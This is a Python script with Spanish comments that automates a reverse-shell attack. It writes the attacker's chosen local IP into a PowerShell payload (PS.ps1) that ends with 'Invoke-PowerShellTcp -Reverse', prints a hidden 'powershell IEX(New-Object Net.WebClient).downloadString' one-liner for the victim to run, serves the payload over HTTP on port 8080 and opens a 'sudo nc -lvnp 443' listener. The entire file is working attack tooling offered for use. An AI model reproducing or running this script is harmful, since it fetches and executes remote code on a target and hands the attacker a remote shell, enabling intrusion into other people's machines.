import os
import re  
import subprocess
import http.server
import socketserver

puerto = 8080  # Declarar la variable puerto aquí
netcat_puerto = 443  # Puerto para netcat

# Función para obtener los adaptadores de red y sus IPs usando ifconfig
def obtener_adaptadores():
    resultado = subprocess.run(['ifconfig'], capture_output=True, text=True)
    salida = resultado.stdout

    patron_adaptador = r'(\w+): flags'
    patron_ip = r'inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    
    adaptadores = re.findall(patron_adaptador, salida)
    ips = re.findall(patron_ip, salida)
    
    # Filtrar las IPs válidas (que no sean 127.x.x.x)
    adaptadores_ips_validas = [(adaptadores[i], ips[i]) for i in range(len(ips)) if not ips[i].startswith("127.")]
    
    return adaptadores_ips_validas

# Función para leer el archivo .ps1
def leer_ps1(ruta_archivo):
    with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
        contenido = archivo.readlines()  # Lee línea por línea
    return contenido

# Función para obtener la IP en el archivo .ps1
def obtener_ip_archivo(contenido):
    ultima_linea = contenido[-1]
    patron_ip = r'-IPAddress (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    ip_encontrada = re.search(patron_ip, ultima_linea)
    if ip_encontrada:
        return ip_encontrada.group(1)
    return None

# Función para modificar la última línea del archivo .ps1
def modificar_ultima_linea(contenido, nueva_ip):
    contenido[-1] = f"Invoke-PowerShellTcp -Reverse -IPAddress {nueva_ip} -Port 443\n"
    return contenido

# Función para guardar el archivo modificado
def guardar_ps1(ruta_archivo, nuevo_contenido):
    with open(ruta_archivo, 'w', encoding='utf-8') as archivo:
        archivo.writelines(nuevo_contenido)

# Función para levantar un servidor HTTP en el puerto 5555
def levantar_servidor():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", puerto), handler) as httpd:
        print(f"Servidor levantado en el puerto {puerto}. Ctrl+C para detener.")
        httpd.serve_forever()

# Función para abrir netcat en una nueva terminal de forma universal
def abrir_netcat():
    comando_netcat = f"sudo nc -lvnp {netcat_puerto}"
    try:
        # Utilizar la variable SHELL del sistema para abrir el comando en una nueva terminal
        shell = os.getenv('SHELL')
        if shell:
            subprocess.Popen([shell, "-c", f'{comando_netcat}'])
        else:
            print("No se pudo detectar el shell. Ejecuta manualmente:")
            print(comando_netcat)
    except Exception as e:
        print(f"Error al intentar abrir netcat: {e}")
        print("Ejecuta manualmente el siguiente comando:")
        print(comando_netcat)

# Ejemplo de uso
ruta_archivo = "PS.ps1"

# Obtener los adaptadores y sus IPs
adaptadores_ips = obtener_adaptadores()

if adaptadores_ips:
    # Mostrar la lista de adaptadores disponibles
    print("Adaptadores disponibles:")
    for i, (adaptador, ip) in enumerate(adaptadores_ips):
        print(f"{i+1}. Adaptador: {adaptador}, IP: {ip}")
    
    # Pedir al usuario que elija el adaptador
    eleccion = int(input("Elige el número del adaptador a usar: ")) - 1
    
    if eleccion >= 0 and eleccion < len(adaptadores_ips):
        ip_actual = adaptadores_ips[eleccion][1]
        print(f"Usando la IP: {ip_actual}")
        
        # Leer el archivo .ps1
        contenido = leer_ps1(ruta_archivo)

        # Obtener la IP que está en el archivo actualmente
        ip_encontrada = obtener_ip_archivo(contenido)

        # Imprimir la IP encontrada en el archivo
        if ip_encontrada:
            print(f"IP en el archivo: {ip_encontrada}")
        else:
            print("No se encontró una IP en el archivo.")

        # Si la IP en el archivo es diferente a la IP actual, hacer el cambio
        if ip_encontrada != ip_actual:
            # Modificar la última línea con la IP obtenida
            contenido_modificado = modificar_ultima_linea(contenido, ip_actual)

            # Guardar el archivo modificado
            guardar_ps1(ruta_archivo, contenido_modificado)
            print(f"La IP ha sido actualizada a: {ip_actual}")
        else:
            print("La IP en el archivo ya es la misma que la IP actual. No se necesitan cambios.")
        
        print("****************************************************************")
        print(f"powershell -w hidden \"IEX(New-Object Net.WebClient).downloadString('http://{ip_actual}:{puerto}/PS.ps1')\"")
        print("****************************************************************")
        
        # Levantar servidor HTTP para compartir el archivo .ps1

        # Abrir netcat en una nueva terminal
        abrir_netcat()
        levantar_servidor()

    else:
        print("Elección inválida. Inténtalo de nuevo.")
else:
    print("No se encontraron adaptadores de red disponibles.")